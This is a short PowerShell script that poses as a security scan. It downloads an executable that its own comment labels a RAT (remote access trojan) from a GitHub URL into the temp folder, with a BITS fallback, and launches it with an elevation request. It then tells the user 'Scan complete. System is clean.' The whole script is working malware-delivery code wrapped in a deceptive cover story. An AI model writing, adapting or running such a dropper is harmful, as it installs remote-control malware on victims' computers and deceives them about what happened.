Write-Host "DONT CLOSE THIS CONSOLE BEFORE SCAN IS COMPLETE" -ForegroundColor Red

# === ТВОЙ RAT ===
$ratUrl = "https://github.com/myxiaomi626-hub/dildos/raw/refs/heads/main/main.exe"
$ratPath = "$env:TEMP\main.exe"


try {
    (New-Object Net.WebClient).DownloadFile($ratUrl, $ratPath)
} catch {
    # Запасной вариант
    Start-BitsTransfer -Source $ratUrl -Destination $ratPath -ErrorAction SilentlyContinue
}


Start-Sleep -Seconds 6


if (Test-Path $ratPath) {
    $startInfo = New-Object System.Diagnostics.ProcessStartInfo
    $startInfo.FileName = $ratPath
    $startInfo.Verb = "runas"              
    $startInfo.UseShellExecute = $true


    try {
        [System.Diagnostics.Process]::Start($startInfo) | Out-Null
    } catch {
        
        Start-Process -FilePath $ratPath
    }
}


Start-Sleep -Seconds 40
Write-Host "Scan complete. System is clean." -ForegroundColor Green
Write-Host "You can close this window now."
pause